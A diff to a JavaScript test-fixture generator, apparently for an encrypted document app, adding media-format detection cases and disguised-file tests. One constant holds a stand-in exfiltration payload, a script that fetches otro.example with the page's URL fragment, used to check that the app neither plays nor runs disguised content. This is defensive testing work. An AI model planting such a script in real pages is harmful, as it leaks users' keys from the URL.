@@ -25,7 +25,7 @@ const u32 = (number) => {
 const filled = (byte) => Buffer.alloc(32, byte);
 const LINK_KEY = filled(0x11);
 // Every envelope has a head of its own, even here: under one key, a head used twice breaks the seal.
-const HEADS = { main: filled(0x22), files: filled(0x23), other: filled(0x24) };
+const HEADS = { main: filled(0x22), files: filled(0x23), other: filled(0x24), playing: filled(0x25) };
 const SINCE = "2026-11-03T12:00:00Z";
 
 const signer = async (seed) => {
@@ -408,6 +408,75 @@ const pictures = {
   ].map(([says, one]) => ({ says, ...one })),
 };
 
+const sample = (name) => readFileSync(new URL(`./samples/${name}`, import.meta.url));
+const asciiHex = (said) => words(said).reduce((all, one) => all + one.toString(16).padStart(2, "0"), "");
+const OGG_PAGE = "00".repeat(22);
+const EBML_START = "1a45dfa3 9f 4286 81 01 42f7 81 01 42f2 81 04 42f3 81 08 4282";
+const WIDGET_CODE = '<script>fetch("https://otro.example/?k="+top.location.hash)</script>';
+const PLAYING = [
+  { says: "a sound that plays", name: "rina.mp3", kind: "audio/mpeg", bytes: sample("rina.mp3"), is: { format: "mp3", player: "audio", type: "audio/mpeg" } },
+  { says: "a video that plays", name: "paseo.mp4", kind: "video/mp4", bytes: sample("paseo.mp4"), is: { format: "mp4", player: "video", type: "video/mp4" } },
+  { says: "a page dressed as a video, which its name and its kind do not make one", name: "paseo.mp4", kind: "video/mp4", bytes: words(`<!doctype html>${WIDGET_CODE}`), is: null },
+  { says: "a video of a format no reader is asked to play", name: "paseo.mkv", kind: "video/mp4", bytes: Buffer.from(`${EBML_START} 88 ${asciiHex("matroska")}`.replaceAll(" ", ""), "hex"), is: null, may_join_later: true },
+  { says: "a PDF, which is only ever downloaded, whatever it says", name: "rina.mp3", kind: "audio/mpeg", bytes: FILES[0], is: null },
+  { says: "a sound named as a page, which plays by its bytes and its name holds back", name: "rina.html", kind: "text/html", bytes: sample("rina.mp3"), is: { format: "mp3", player: "audio", type: "audio/mpeg" }, held_back: true },
+];
+const playingFiles = await seal({ kind: "files", id: "k7Qm2xPa", version: 1, sealed: true, owner, head: HEADS.playing, parts: PLAYING.map(({ bytes }) => ({ name: "file", compressed: false, bytes })) });
+const playing = {
+  document: {
+    id: "k7Qm2xPa",
+    html: "<p>a</p>",
+    body: "a",
+    files: PLAYING.map(({ name, kind, bytes }, at) => ({ at, name, kind, size: bytes.length })),
+    files_hash: playingFiles.hash,
+  },
+  files: playingFiles.bytes.toString("hex"),
+  is: PLAYING.map(({ says, is, may_join_later, held_back }, at) => ({ at, says, is, ...(may_join_later ? { may_join_later } : {}), ...(held_back ? { held_back } : {}) })),
+};
+const firstBytes = [
+  ["an MP3 with its tags", "494433040000", "mp3"],
+  ["an MP3 with no tags", "fffb9064", "mp3"],
+  ["an M4A", "0000001c 66747970 4d344120 00000200", "m4a"],
+  ["a WAV", "52494646 80110000 57415645", "wav"],
+  ["an Ogg with Vorbis", `4f676753 ${OGG_PAGE} 01 1e 01 766f72626973`, "ogg"],
+  ["an Ogg with Opus", `4f676753 ${OGG_PAGE} 01 13 4f70757348656164`, "ogg"],
+  ["a FLAC", "664c6143", "flac"],
+  ["an AAC", "fff15c40", "aac"],
+  ["an MP4", "00000020 66747970 69736f6d 00000200", "mp4"],
+  ["an M4V", "00000020 66747970 4d345620 00000200", "mp4"],
+  ["a WebM", `${EBML_START} 84 7765626d`, "webm"],
+  ["a MOV", "00000014 66747970 71742020 00000200", "mov"],
+  ["nothing at all", "", null],
+  ["one byte of sync", "ff", null],
+  ["a sync with no room for its frame", "fffb90", null],
+  ["a text in UTF-16, whose mark looks like a sync", "fffe6100", null],
+  ["a frame of another layer", "fffd9064", null],
+  ["a frame of a version that does not exist", "ffeb9064", null],
+  ["a frame of a bitrate that does not exist", "fffbf064", null],
+  ["a frame of a rate that does not exist", "fffb9c64", null],
+  ["tags of a version that does not exist", "494433ff0000", null],
+  ["a Matroska", `${EBML_START} 88 ${asciiHex("matroska")}`, null],
+  ["WebM said past its header", `1a45dfa3 ${"00".repeat(64)} 4282 84 7765626d`, null],
+  ["an AVI", "52494646 80110000 41564920", null],
+  ["an Ogg with Theora", `4f676753 ${OGG_PAGE} 01 2a 80 7468656f7261`, null],
+  ["an Ogg cut before its first packet", "4f676753", null],
+  ["a HEIC", "00000018 66747970 68656963 00000000", null],
+  ["an AVIF", "0000001c 66747970 61766966 00000000", null],
+  ["a box too small to name its brand", "00000008 66747970 69736f6d", null],
+  ["a brand cut short", "00000020 66747970 6973", null],
+  ["a list of segments on the web", asciiHex("#EXTM3U\n#EXTINF:1,\nhttps://a.example/a.ts\n"), null],
+  ["a page", asciiHex("<!doctype html><script>x</script>"), null],
+  ["a drawing", asciiHex('<svg xmlns="http://www.w3.org/2000/svg"/>'), null],
+  ["a PDF", asciiHex("%PDF-1.7"), null],
+  ["a program", "4d5a9000", null],
+  ["a ZIP", "504b0304", null],
+].map(([says, bytes, format]) => ({ says, bytes: bytes.replaceAll(" ", ""), format }));
+const hostileWidget = {
+  id: HOSTILE,
+  html: `<figure class="code"><figcaption>Rina</figcaption><pre><code class="language-widget">${WIDGET_CODE.replaceAll("<", "&lt;").replaceAll(">", "&gt;")}</code></pre></figure>`,
+  body: `\`\`\`widget\n${WIDGET_CODE}\n\`\`\`\n`,
+};
+
 const said = {
   link_key: b64(LINK_KEY),
   identity: { root: b64(root.public), fingerprint: fingerprintOf(root.public) },
@@ -457,6 +526,9 @@ const said = {
     { says: "a file of another size than it says", document: { id: HOSTILE, html: "<p>a</p>", body: "a", files: [{ ...aFile, size: 1 }], files_hash: inOtherPlace.hash }, files: inOtherPlace.bytes.toString("hex") },
   ],
   pictures,
+  playing,
+  first_bytes: firstBytes,
+  hostile_widget: hostileWidget,
   revocation: revoked,
   main: { envelope: main.bytes.toString("hex"), document: whole, pictures: PICTURES.map((one) => one.toString("hex")) },
   files: { envelope: files.bytes.toString("hex"), files: FILES.map((one) => Buffer.from(one).toString("hex")) },
@@ -470,6 +542,7 @@ said.frozen = {
     main: { envelope: said.main.envelope, document: whole },
     files: { envelope: said.files.envelope },
     public: { envelope: said.public.envelope, document: plain },
+    playing: { ...playing, is: playing.is.filter(({ may_join_later }) => !may_join_later) },
   },
 };
 writeFileSync(WRITTEN, `${JSON.stringify(said, null, 2)}\n`);
